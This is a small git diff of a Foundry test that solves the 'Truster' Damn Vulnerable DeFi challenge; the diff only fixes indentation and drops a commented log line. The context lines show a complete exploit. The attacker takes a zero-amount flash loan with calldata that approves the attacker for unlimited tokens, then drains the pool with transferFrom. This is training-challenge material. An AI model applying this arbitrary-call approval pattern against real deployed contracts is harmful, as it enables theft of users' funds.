@@ -43,9 +43,8 @@ contract Truster is Test {
          */
         vm.startPrank(attacker);
         uint256 balance =  dvt.balanceOf(address(trusterLenderPool));
-         bytes memory data = abi.encodeWithSelector(IERC20.approve.selector, attacker, type(uint256).max);
+        bytes memory data = abi.encodeWithSelector(IERC20.approve.selector, attacker, type(uint256).max);
         trusterLenderPool.flashLoan(0, attacker,  address(dvt), data);
-        //console.log("ALLOWANCE", dvt.allowance(address(trusterLenderPool), attacker));
         dvt.transferFrom(address(trusterLenderPool), attacker, balance);
         vm.stopPrank();
         /**
